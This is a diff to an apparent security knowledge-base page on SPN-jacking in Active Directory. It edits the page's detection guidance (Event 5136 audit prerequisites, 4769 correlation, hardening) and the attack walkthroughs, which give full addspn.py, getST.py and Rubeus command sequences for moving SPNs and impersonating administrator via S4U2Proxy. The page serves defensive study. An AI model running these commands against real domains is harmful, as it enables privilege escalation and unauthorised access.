@@ -2,6 +2,8 @@
 
 Privilege escalation by moving Service Principal Names between accounts.
 
+**MITRE ATT&CK:** [T1558](https://attack.mitre.org/techniques/T1558/) Steal or Forge Kerberos Tickets; [T1098](https://attack.mitre.org/techniques/T1098/) Account Manipulation
+
 SPN-jacking exploits the fact that Kerberos constrained delegation targets are specified as
 **SPNs** (in `msDS-AllowedToDelegateTo`), and SPNs can be moved between AD accounts by anyone
 with write access to the `servicePrincipalName` attribute. By moving an SPN from its legitimate
@@ -122,6 +124,17 @@ index=security EventCode=5136 AttributeLDAPDisplayName="servicePrincipalName"
 | stats count by ObjectDN, OperationType, AttributeValue, SubjectUserName
 ```
 
+!!! warning "Event 5136 needs two things before it is logged"
+    The **Audit Directory Service Changes** subcategory must be enabled on domain controllers,
+    and, in Microsoft's words, "the modified object must have an appropriate entry in SACL: the
+    'Write' action auditing for specific attributes". If the auditing entries (SACL) on the
+    computer and user objects do not cover writes to `servicePrincipalName`, an SPN can be
+    moved without any 5136 event. Verify by making a test change and looking for the event.
+
+    In the raw event XML, `OperationType` is a message code: `%%14674` for "Value Added" and
+    `%%14675` for "Value Deleted". A move appears as a "Value Deleted" on one object and a
+    "Value Added" on another.
+
 ### Restrict Write Access to servicePrincipalName
 
 Audit which accounts have write access to the `servicePrincipalName` attribute across AD:
@@ -137,19 +150,19 @@ their expected accounts:
 
 ```powershell title="Audit constrained delegation targets and identify orphaned SPNs"
 Get-ADObject -Filter 'msDS-AllowedToDelegateTo -like "*"' `
-  -Properties msDS-AllowedToDelegateTo |
-  ForEach-Object {
-    $obj = $_
-    $_.('msDS-AllowedToDelegateTo') | ForEach-Object {
-      $spn = $_
-      $owner = Get-ADObject -Filter "servicePrincipalName -eq '$spn'" -Properties Name
-      [PSCustomObject]@{
-        DelegatingAccount = $obj.Name
-        TargetSPN = $spn
-        SPNOwner = if ($owner) { $owner.Name } else { "ORPHANED" }
-      }
+    -Properties msDS-AllowedToDelegateTo |
+    ForEach-Object {
+        $obj = $_
+        $_.('msDS-AllowedToDelegateTo') | ForEach-Object {
+            $spn = $_
+            $owner = Get-ADObject -Filter "servicePrincipalName -eq '$spn'" -Properties Name
+            [PSCustomObject]@{
+                DelegatingAccount = $obj.Name
+                TargetSPN         = $spn
+                SPNOwner          = if ($owner) { $owner.Name } else { "ORPHANED" }
+            }
+        }
     }
-  }
 ```
 
 Any SPN marked as `ORPHANED` is vulnerable to ghost SPN-jacking.
@@ -166,7 +179,7 @@ Prevent unprivileged users from creating computer accounts that could be used as
 targets:
 
 ```powershell
-Set-ADDomain -Identity CORP.LOCAL -Replace @{"ms-DS-MachineAccountQuota" = 0}
+Set-ADDomain -Identity CORP.LOCAL -Replace @{"ms-DS-MachineAccountQuota" = 0 }
 ```
 
 ---
@@ -175,7 +188,9 @@ Set-ADDomain -Identity CORP.LOCAL -Replace @{"ms-DS-MachineAccountQuota" = 0}
 
 ### Event 5136: SPN Attribute Changes
 
-The primary detection signal. Any change to `servicePrincipalName` should be reviewed:
+The primary detection signal, provided the audit prerequisites under
+[Monitor SPN Changes](#monitor-spn-changes-event-5136) are in place. Any change to
+`servicePrincipalName` should be reviewed:
 
 | Operation | Meaning |
 |-----------|---------|
@@ -191,7 +206,8 @@ resolves to a valid account. Alert when SPNs become orphaned.
 ### S4U2Proxy Activity After SPN Changes
 
 Correlate Event 5136 (SPN change) with Event 4769 (service ticket request, particularly with
-`Transited Services` populated). If an SPN change is immediately followed by S4U2Proxy
+`Transited Services` populated, the field Microsoft documents for constrained delegation; 4769
+requires the Audit Kerberos Service Ticket Operations subcategory). If an SPN change is immediately followed by S4U2Proxy
 delegation activity targeting that SPN, this is a strong indicator of SPN-jacking.
 
 ### Unexpected SPNs on Accounts
@@ -212,15 +228,15 @@ When the target SPN in `msDS-AllowedToDelegateTo` is not registered on any accou
 
 ```bash title="Ghost SPN-jacking: register orphaned SPN, then S4U2Proxy to impersonate administrator"
 # 1. Verify the SPN is orphaned
-findDelegation.py CORP.LOCAL/jsmith:password -dc-ip 10.0.0.1
+findDelegation.py 'CORP.LOCAL/jsmith:<password>' -dc-ip 192.0.2.10
 
 # 2. Register the orphaned SPN on an account you control
 addspn.py -t ServerC$ -s CIFS/serverB.corp.local \
-  -u CORP.LOCAL/jsmith -p password dc01.corp.local
+  -u CORP.LOCAL/jsmith -p '<password>' dc1.corp.local
 
 # 3. Perform S4U2Proxy delegation
 getST.py -spn CIFS/serverB.corp.local -impersonate administrator \
-  CORP.LOCAL/serverA$:ServerAPassword
+  'CORP.LOCAL/serverA$:<password>'
 
 # 4. Use the ticket
 export KRB5CCNAME=administrator@CIFS_serverB.corp.local@CORP.LOCAL.ccache
@@ -234,15 +250,15 @@ When the target SPN exists on a legitimate account:
 ```bash title="Live SPN-jacking: move SPN to attacker-controlled account, then S4U2Proxy"
 # 1. Remove the SPN from the legitimate account (requires WriteSPN on ServerB)
 addspn.py -t ServerB$ -r CIFS/serverB.corp.local \
-  -u CORP.LOCAL/jsmith -p password dc01.corp.local
+  -u CORP.LOCAL/jsmith -p '<password>' dc1.corp.local
 
 # 2. Add the SPN to an account you control
 addspn.py -t ServerC$ -s CIFS/serverB.corp.local \
-  -u CORP.LOCAL/jsmith -p password dc01.corp.local
+  -u CORP.LOCAL/jsmith -p '<password>' dc1.corp.local
 
 # 3. S4U2Proxy delegation (same as ghost variant)
 getST.py -spn CIFS/serverB.corp.local -impersonate administrator \
-  CORP.LOCAL/serverA$:ServerAPassword
+  'CORP.LOCAL/serverA$:<password>'
 ```
 
 ### SPN Substitution (sname Rewrite)
@@ -263,7 +279,7 @@ On Windows with Rubeus:
 ```powershell
 # S4U chain with SPN substitution in one step
 Rubeus.exe s4u /user:serverA$ /rc4:<hash> /impersonateuser:administrator `
-  /msdsspn:HTTP/serverB.corp.local /altservice:CIFS /ptt
+    /msdsspn:HTTP/serverB.corp.local /altservice:CIFS /ptt
 
 # Or rewrite an existing ticket
 Rubeus.exe tgssub /altservice:cifs/serverB.corp.local /ticket:<base64>
@@ -279,9 +295,9 @@ Rubeus.exe tgssub /altservice:cifs/serverB.corp.local /ticket:<base64>
 
 | Tool | Command | Purpose |
 |---|---|---|
-| krbrelayx `addspn.py` | `addspn.py -t target$ -s SPN -u user -p pass dc` | Add or remove SPNs from AD objects |
-| impacket `findDelegation.py` | `findDelegation.py DOMAIN/user:pass` | Enumerate delegation configurations and identify target SPNs |
-| impacket `getST.py` | `getST.py -spn SPN -impersonate user DOMAIN/svc$:pass` | Perform S4U2Self + S4U2Proxy chain |
+| krbrelayx `addspn.py` | `addspn.py -t target$ -s SPN -u user -p <password> dc` | Add or remove SPNs from AD objects |
+| impacket `findDelegation.py` | `findDelegation.py DOMAIN/user:<password>` | Enumerate delegation configurations and identify target SPNs |
+| impacket `getST.py` | `getST.py -spn SPN -impersonate user DOMAIN/svc$:<password>` | Perform S4U2Self + S4U2Proxy chain |
 | impacket `tgssub.py` | `tgssub.py -in ticket.ccache -out new.ccache -altservice cifs/host` | Rewrite the `sname` field in an existing ticket |
 | Rubeus | `s4u /msdsspn:SPN /altservice:CIFS /impersonateuser:admin` | Full S4U chain with SPN substitution |
 | PowerView | `Set-DomainObject -Identity target$ -Set @{ServicePrincipalName='SPN'}` | Manipulate SPNs via PowerShell |
